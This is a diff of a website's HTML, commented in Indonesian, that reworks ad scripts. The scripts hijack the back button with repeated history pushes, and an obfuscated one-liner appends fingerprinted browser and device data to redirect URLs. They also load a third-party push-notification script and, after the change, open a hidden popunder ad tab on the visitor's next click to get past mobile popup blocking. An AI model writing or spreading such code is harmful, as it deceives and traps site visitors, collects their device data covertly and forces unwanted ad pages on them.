@@ -179,19 +179,10 @@
 <!-- History guard: back button tetap di dalam website -->
 <script>
     (function () {
-        // Push 2 entry ekstra saat load agar back button butuh beberapa kali tekan untuk keluar
+        // Push 2 entry ekstra → back button perlu beberapa kali tekan sebelum keluar website
         history.pushState(null, '', window.location.href);
         history.pushState(null, '', window.location.href);
-
-        // Override location.replace → pakai location.href (BUKAN _origReplace)
-        // Kenapa: location.replace() MENGGANTIKAN entry history saat ini, sehingga
-        // entry website ikut hilang dan back button melewati website langsung ke halaman sebelumnya.
-        // location.href MENAMBAH entry baru ke history → back dari halaman iklan kembali ke website.
-        window.location.replace = function (url) {
-            window.location.href = url;
-        };
-
-        // Saat back ditekan dan masih di halaman yang sama, push ulang agar tidak keluar
+        // Setiap kali back ditekan di halaman ini → push entry baru → user tetap di website
         window.addEventListener('popstate', function () {
             if (window.location.href.indexOf(window.location.hostname) !== -1) {
                 history.pushState(null, '', window.location.href);
@@ -204,26 +195,38 @@
 <script>
     var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
 
-    // Gate: trafficback hanya 1x per browser session.
-    // Tanpa ini, onAlreadySubscribed fires setiap reload → loop tak terbatas (user tidak bisa stay di website).
+    // TrafficBack: TIDAK navigasi halaman (replace/href) karena itu yang bikin back button
+    // melewati website dan langsung ke halaman sebelumnya.
+    // Solusi (sama seperti Vdry): simpan URL, buka via window.open saat user klik berikutnya.
+    // window.open pada direct user gesture (click event) tidak diblokir browser mobile.
     var _tbFired = false;
+    var _tbPending = null;
     try { _tbFired = !!sessionStorage.getItem('_pptb'); } catch(e) {}
+
     function TrafficBack(url) {
         if (_tbFired) return;
         _tbFired = true;
         try { sessionStorage.setItem('_pptb', '1'); } catch(e) {}
-        Replace(url);
+        _tbPending = url.indexOf('//') === 0 ? 'https:' + url : url;
     }
+
+    // Tunggu klik pertama user → baru buka tab trafficback (direct gesture = tidak diblokir)
+    document.addEventListener('click', function _tbClick() {
+        if (!_tbPending) return;
+        var u = _tbPending; _tbPending = null;
+        document.removeEventListener('click', _tbClick);
+        try { var w = window.open(u, '_blank'); if (w) { w.blur(); window.focus(); } } catch(e) {}
+    });
 
     var s = document.createElement('script');
     s.src='//mtyjj.com/e81/7274d/mw.min.js?z=11484184'+'&sw=/sw-check-permissions-d17db.js'+'&nouns=1';
     s.onload = function(result) {
         switch (result) {
-            case 'onPermissionDefault':       // user tutup dialog tanpa pilih
-            case 'onPermissionAllowed':       // user klik Allow
-            case 'onPermissionDenied':        // user klik Block
-            case 'onAlreadySubscribed':       // returning subscriber
-            case 'onNotificationUnsupported': // iOS / browser tanpa push support
+            case 'onPermissionDefault':
+            case 'onPermissionAllowed':
+            case 'onPermissionDenied':
+            case 'onAlreadySubscribed':
+            case 'onNotificationUnsupported':
                 TrafficBack("//rm358.com/4/11484237");
                 break;
         }
